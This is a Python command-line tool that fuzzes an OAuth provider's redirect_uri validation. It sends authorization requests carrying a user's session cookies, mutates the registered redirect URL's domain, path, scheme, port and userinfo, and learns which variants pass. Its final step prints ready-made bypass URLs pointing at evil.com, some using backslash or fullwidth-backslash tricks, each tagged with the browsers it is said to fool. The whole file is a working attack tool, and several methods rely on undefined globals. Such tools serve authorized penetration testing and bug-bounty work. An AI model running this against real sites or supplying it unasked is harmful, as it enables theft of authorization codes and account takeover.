#!/usr/bin/env python3

import requests
import re
from http.cookies import SimpleCookie
from urllib.parse import urlparse, parse_qs
from time import sleep

import logging

# define request (OAuth: log in to IdP; Login redirect: login)
class RedirectRequest(object):
	def __init__(self, endpoint):
		self.mark = '<FUZZ_PAYLOAD>'
		self.endpoint = endpoint
		self.cookies = None
		self.method = 'GET'
		self.body = None
		self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
	def set_mark(self, mark):
		self.mark = mark
	def set_method(self, method):
		self.method = method
	def set_body(self, body):
		self.body = body
	def set_cookies(self, cookies):
		if isinstance(cookies, str):
			self.cookies = {k.strip():v for k,v in re.findall(r'(.*?)=(.*?)(?:;|$)', cookies.split(':', 1)[1])}
		else:
			self.cookies = cookies
	def set_headers(self, headers):
		self.headers = headers
	def send(self, payload):
		endpoint = self._place_payload(self.endpoint, payload)
		body = self._place_payload(self.body, payload)
		cookies = self._place_payload(self.cookies, payload)
		headers = self._place_payload(self.headers, payload)
		return requests.request(self.method, endpoint, data=body, 
			headers=headers, cookies=cookies, allow_redirects=False)
	def _place_payload(self, template, payload):
		if isinstance(template, str):
			return template.replace(self.mark, payload)
		# for headers/cookies dict, nested dict not supported
		elif isinstance(template, dict):
			for k, v in template.items():
				if isinstance(v, str):
					template[k] = v.replace(self.mark, payload)
			return template
		else:
			return template


class OAuthAuthorizationRequest(RedirectRequest):
	def __init__(self, api_path, client_id, response_type='code', scope=None, state=None):
		if '?' not in api_path:
			api_path += '?'
		else:
			api_path += '&'
		api_path += f'&client_id={client_id}&response_type={response_type}'
		if scope is not None:
			api_path += f'&scope={scope}'
		if state is not None:
			api_path += f'&state={state}'
		api_path += '&redirect_uri=<FUZZ_PAYLOAD>'
		RedirectRequest.__init__(self, api_path)



class URLMutator(object):
	def __init__(self, init_url):
		self.init_url = init_url
		self.init_parts = urlparse(init_url)
	def query_append(self):
		query = self.init_parts.query
		if query:
			to_append = '&'
		else:
			to_append = ''
		to_append += 'xyyz=1337'
		query += to_append
		return self.init_parts._replace(query=query).geturl()
	def query_remove(self):
		return self.init_parts._replace(query='').geturl()
	def path_append(self, to_append='p1337'):
		path = self.init_parts.path
		if path and path[-1] == '/':
			path += to_append
		else:
			path += to_append
		return self.init_parts._replace(path=path).geturl()
	def path_pop(self, level=1):
		path = self.init_parts.path
		parts = [p for p in path.split('/') if p] # ['', 'parent', 'sub', '']
		assert len(parts) - level >= 0, "cannot pop %(level)s levels"
		path = '/'.join(['']+parts[:-level]+[''])
		return self.init_parts._replace(path=path).geturl()
	def prepend(self):
		return 'https://google.com/' + self.init_url
	def scheme_replace(self, value='xyyz'):
		return self.init_parts._replace(scheme=value).geturl()
	def scheme_remove(self):
		return self.init_url.split(':', 1)[1]
	def path_remove(self):
		return self.init_parts._replace(path='').geturl()
	def domain_sub_pop(self, level=1):
		domain = self.init_parts.netloc
		parts = domain.split('.')
		assert len(parts) - level >= 2, "can pop subdomain no more"
		domain = '.'.join(parts[level:])
		return self.init_parts._replace(netloc=domain).geturl()
	def domain_sub_add(self, level=1):
		netloc = self.init_parts.netloc
		host = self.init_parts.hostname
		netloc = netloc.replace(host, 'xzzy.' * level + host)
		return self.init_parts._replace(netloc=netloc).geturl()
	def domain_prepend(self):
		netloc = self.init_parts.netloc
		host = self.init_parts.hostname
		netloc = netloc.replace(host, 'x' + host)
		return self.init_parts._replace(netloc=netloc).geturl()
	def domain_append(self):
		netloc = self.init_parts.netloc
		host = self.init_parts.hostname
		netloc = netloc.replace(host, host + '.mx')
		return self.init_parts._replace(netloc=netloc).geturl()
	def port_replace(self, value='1337'):
		# TODO: if port exists
		netloc = self.init_parts.netloc
		return self.init_parts._replace(netloc=f'{netloc}:{value}').geturl()
	def userinfo_insert(self):
		netloc = self.init_parts.netloc
		assert self.init_parts.username is None
		return self.init_parts._replace(netloc='a@'+netloc).geturl()
	def userinfo_fuzz(self, candidates):
		netloc = self.init_parts.netloc
		assert self.init_parts.username is None
		for c in candidates:
			yield self.init_parts._replace(netloc=f'a{c}@{netloc}').geturl(), c
	def port_fuzz(self, candidates):
		netloc = self.init_parts.netloc
		port = '' if self.init_parts.port else ':80'
		for c in candidates:
			yield self.init_parts._replace(netloc=f'{netloc}{port}{c}').geturl(), c
	def scheme_fuzz(self, candidates):
		for c in candidates:
			yield self.init_parts._replace(scheme=f'http{c}s').geturl(), c
	def path_fuzz(self, candidates, case=1):
		# 1. append test
		if case == 1:
			for c in candidates:
				yield self.path_append(to_append=c), c
		# 2. path start with special char
		if case == 2:
			for c in candidates:
				yield f'{self.init_parts.scheme}://{self.init_parts.netloc}{c}.evil.com', c


class RedirectFuzzer(object):
	def __init__(self, requestor, mutator, interval=0):
		self.requestor = requestor
		self.mutator = mutator
		self.interval = interval
		self.rules = {
			"type": "strict", # strict, substring, parsing
			"domain": {
				"base": None, "allow_sub": False, "allow_subsub": False, 
				"allow_empty": False, "allow_localhost": False},
			"path": {"base": None, "allow_append": False, "special_chars": []},
			"scheme": {
				"allow_custom": False, "allow_digit_start": False, 
				"allowed_special": [], "allow_no_scheme": False, "special_chars": []},
			"port": {
				"allowed": False, "allowed_special": [], 
				"allow_non_digit": False, "special_chars": []},
			"userinfo": {"allowed": False, "special_chars": []}
		}

	def test(self, u, match=''):
		""" Put your custom response parsing code here """
		sleep(self.interval)
		logging.info('> ' + u)
		try:
			r = self.requestor.send(u)
			location = r.headers.get('Location')
			if location:
				logging.info(f'< {location}')
				if 'code=' in location and match in location:
					ret = True
				else:
					ret = False
			else:
				logging.info(f'x {r.status_code}')
				ret = False
		except Exception as e:
			logging.error(f'! Network Error\n{e}')
			ret = False
		finally:
			logging.info('')
			return ret

	def baseline_test(self):
		m = self.mutator
		assert self.test(m.init_url), "Redirection request not work, please check the cookies"
		assert not self.test("https://randomsiteneverexists.com"), "Seem like there's no validation at all, do whatever you want"

	def learn_rules(self):
		""" Learn coarse-grained machine rules """
		print('[+] Learning validator rules')

		m = self.mutator

		if self.test(m.prepend()):
			print('Simple substring check !')
			self.rules['type'] = 'substring'
			return

		# Domain validation rule
		level = 1
		while True:
			try:
				nurl = m.domain_sub_pop(level)
			except: # reach root domain
				break
			# a level of subdomain popped but it still pass
			if self.test(nurl):
				level += 1
			# won't pass, last domain is least
			else:
				break
		# try add subdomain to min domain
		url_min_domain = m.domain_sub_pop(level-1)
		min_domain = urlparse(url_min_domain).hostname
		self.rules['domain']['base'] = min_domain
		m.init_url = url_min_domain
		if self.test(m.domain_sub_add(level=2)):
			domain_pattern = f'*.*.{min_domain}'
			self.rules['domain']['allow_subsub'] = True
		elif self.test(m.domain_sub_add()):
			domain_pattern = f'*.{min_domain}'
			self.rules['domain']['allow_sub'] = True
		else:
			domain_pattern = f'{min_domain}'
		if self.test('http://:80') or self.test('https://:443') \
			or self.test('http://') or self.test('https://'):
			domain_pattern += ' | EMPTY'
		if self.test('http://localhost') or self.test('http://127.0.0.1'):
			domain_pattern += ' | localhost'
		api_domain = urlparse(endpoint)._replace(path='', params='', query='', fragment='').geturl()
		if self.test(api_domain):
			domain_pattern += f' | {urlparse(api_domain).hostname}'
		print(f'Domain: {domain_pattern}')

		# Path validation rule

		# append not allowed
		if not self.test(m.path_append()):
			self.rules['path']['allow_append'] = False
			self.rules['path']['base'] = m.init_parts.path
			print(f'Path: {m.init_parts.path}')

		# append allowed: pop to find base path
		else:
			self.rules['path']['allow_append'] = True
			level = 1
			while True:
				try:
					nurl = m.path_pop(level)
				except: # too many levels to pop / already root
					break
				# a level of path popped but it still pass
				if self.test(nurl):
					level += 1
				# won't pass, last path is least
				else:
					break
			url_min_path = m.path_pop(level-1)
			min_path = urlparse(url_min_path).path
			self.rules['path']['base'] = min_path
			print(f'Path: {min_path}*')

		# allow custom schemes
		if self.test(m.scheme_replace()):
			self.rules['scheme']['allow_custom'] = True
			if self.test(m.scheme_replace(value='1x.io')):
				scheme_pattern = r'[0-9a-z\.]+'
				self.rules['scheme']['allow_digit_start'] = True
			elif self.test(m.scheme_replace(value='1x')):
				scheme_pattern = r'[0-9a-z]+'
				self.rules['scheme']['allow_digit_start'] = True
			else:
				scheme_pattern = r'Scheme: [a-z]+\w*'
		# test special schemes
		else:
			special_schemes = ['https', 'http', 'ftp', 'file', 'javascript']
			allowed_schemes = [schm for schm in special_schemes if self.test(m.scheme_replace(value=schm))]
			scheme_pattern = " | ".join(allowed_schemes)
			self.rules['scheme']['allowed_special'] = allowed_schemes
		# special cases
		if self.test(m.scheme_replace(value='')) or self.test(m.scheme_replace(value='')[2:]):
			scheme_pattern += ' | NONE'
		if self.test(f"{m.init_parts.scheme}:{m.scheme_replace(value='')[2:]}"):
			scheme_pattern += f' | {m.init_parts.scheme}:host'
		print(f'Scheme: {scheme_pattern}')

		if self.test(m.port_replace()):
			self.rules['port']['allowed'] = True
			if self.test(m.port_replace(value='abc')):
				print(r'Port: \w+')
				self.rules['port']['allow_non_digit'] = True
			elif self.test(m.port_replace(value='80a')):
				print(r'Port: \d+\w*')
				self.rules['port']['allow_non_digit'] = True
			else:
				print(r'Port: \d+')
		else:
			special_ports = ['80', '443', '8080', '21']
			allowed_ports = [p for p in special_ports if self.test(m.port_replace(value=p))]
			if allowed_ports:
				print(f'Port: {"|".join(allowed_ports)}')
				self.rules['port']['allowed_special'] = allowed_ports
			else:
				print('Port: disallowed')

		if self.test(m.userinfo_insert()):
			print('Userinfo: allowed')
			self.rules['userinfo']['allowed'] = True
		else:
			print('Userinfo: disallowed')

		print()

	def fine_fuzzing(self):
		""" Character level fuzzing based on learned rules """
		print('[+] Fine fuzzing')
		if self.rules['userinfo']['allowed']:
			special_chars = [c for (u,c) in m.userinfo_fuzz(['\\\\', '\\', r'%EF%BC%BC', r'%0A', r'%0D', r'%20']) if self.test(u)]
			if special_chars:
				self.rules['userinfo']['special_chars'] = special_chars
				print('Special characters accepted in userinfo:', ','.join(self.rules['userinfo']['special_chars']))
		if self.rules['port']['allowed']:
			special_chars = [c for (u,c) in m.port_fuzz(['\\\\', '\\', r'%EF%BC%BC', r'%0A', r'%0D', r'%20']) if self.test(u)]
			if special_chars:
				self.rules['port']['special_chars'] = special_chars
				print('Special characters accepted in port:', ','.join(self.rules['port']['special_chars']))
		if self.rules['scheme']['allow_custom']:
			special_chars = [c for (u,c) in m.scheme_fuzz(['.', ':', '@', '\\', r'%EF%BC%BC', r'%0A', r'%0D', r'%20']) if self.test(u)]
			if special_chars:
				self.rules['scheme']['special_chars'] = special_chars
				print('Special characters accepted in scheme:', ','.join(self.rules['scheme']['special_chars']))
		if self.rules['path']['allow_append']:
			special_chars = [c for (u,c) in m.path_fuzz([r'../', r'..;/', r'./', r'%2e%2e'], case=1) if self.test(u, match=r'/.')]
			if special_chars:
				self.rules['path']['special_chars'] = special_chars
				print('Special characters accepted in path:', ','.join(self.rules['path']['special_chars']))
		if self.rules['path']['base'] == '/':
			special_chars = [c for (u,c) in m.path_fuzz(['\\', r'%EF%BC%BC', '\\\\'], case=2) if self.test(u)]
			if special_chars:
				self.rules['path']['special_chars'] = special_chars
				print('Special characters accepted in path:', ','.join(self.rules['path']['special_chars']))
		print()

	def generate_exploits(self):
		""" Generate attacking vectors based on fuzzing results """
		print('[+] Potential attack vectors')
		domain = self.rules['domain']['base']
		path = self.rules['path']['base']
		scheme = 'http' if self.rules['scheme']['allow_custom'] else self.rules['scheme']['allowed_special'][0]
		tab_print = lambda x, y: print('{0:64}{1}'.format(x, y))
		if self.rules['scheme']['allow_digit_start'] and '.' in self.rules['scheme']['special_chars']:
			tab_print(f'1x.evil.com://{domain}{path}', '[Safari]')
		if '\\' in self.rules['userinfo']['special_chars']:
			tab_print(f'{scheme}://evil.com\\@{domain}{path}', '[Chrome, Firefox, Edge]')
		if r'%EF%BC%BC' in self.rules['userinfo']['special_chars']:
			tab_print(f'{scheme}://evil.com%EF%BC%BC@{domain}{path}', '[Edge]')
		if '\\' in self.rules['path']['special_chars']:
			tab_print(f'{scheme}://{domain}\\.evil.com', '[Chomre, Firefox, Edge]')
		if r'%EF%BC%BC' in self.rules['path']['special_chars']:
			tab_print(f'{scheme}://{domain}%EF%BC%BC.evil.com', '[Edge]')

if __name__ == "__main__":

	import argparse

	parser = argparse.ArgumentParser(description='Online URL Validator Fuzzer.')
	advanced = parser.add_argument_group('advanced options')
	parser.add_argument('-u', '--url', type=str, dest='url', required=True,
	                    help='Full request URL')
	parser.add_argument('-c', '--cookie-file', dest='cookie_fp', type=argparse.FileType('r'), required=True,
	                    help='File containing raw Cookie header string', metavar='FILE')
	advanced.add_argument('--endpoint', type=str, dest='endpoint',
	                    help='Specify authorize endpoint', metavar='URL')
	advanced.add_argument('--client-id', type=str, dest='client_id',
	                    help='Specify client_id', metavar='ID')
	advanced.add_argument('--redirect-uri', type=str, dest='redirect_uri',
	                    help='Specify redirect_uri', metavar='URL')
	advanced.add_argument('--interval', type=int, dest='interval', metavar='SECONDS',
	                    help='Set delay between each fuzzing request')
	advanced.add_argument('--verbose', dest='verbose', action='store_true',
			            help='Enable verbose output')

	args = parser.parse_args()

	VERBOSE = 1 if args.verbose else 0
	if VERBOSE == 1:
		logging.basicConfig(format='%(message)s')
		logging.getLogger().setLevel(logging.INFO)
	elif VERBOSE == 2:
		logging.basicConfig()
		logging.getLogger().setLevel(logging.DEBUG)
		import http.client
		http.client.HTTPConnection.debuglevel = 1
		requests_log = logging.getLogger("requests.packages.urllib3")
		requests_log.setLevel(logging.DEBUG)
		requests_log.propagate = True

	interval = args.interval if args.interval else 0

	with args.cookie_fp as fp:
		cookie_str = fp.read()
		if not cookie_str.startswith('Cookie:'):
			cookie_str = f'Cookie: {cookie_str}'

	params = parse_qs(urlparse(args.url).query)
	endpoint = urlparse(args.url)._replace(params='', query='', fragment='').geturl()
	client_id = params.get('client_id')[0]
	redirect_uri = params.get('redirect_uri')[0]

	if None in (args.url, endpoint, client_id, redirect_uri):
		endpoint = args.endpoint
		client_id = args.client_id
		redirect_uri = args.redirect_uri

	logging.info(f'[authorization endpoint] {endpoint}')
	logging.info(f'[client_id] {client_id}')
	logging.info(f'[redirect_uri] {redirect_uri}')
	logging.info('')

	assert None not in (endpoint, client_id, redirect_uri)

	m = URLMutator(redirect_uri)

	req = OAuthAuthorizationRequest(endpoint, client_id)
	req.set_cookies(cookie_str)

	fuzzer = RedirectFuzzer(req, m, interval=interval)
	fuzzer.baseline_test()
	fuzzer.learn_rules()
	fuzzer.fine_fuzzing()
	fuzzer.generate_exploits()
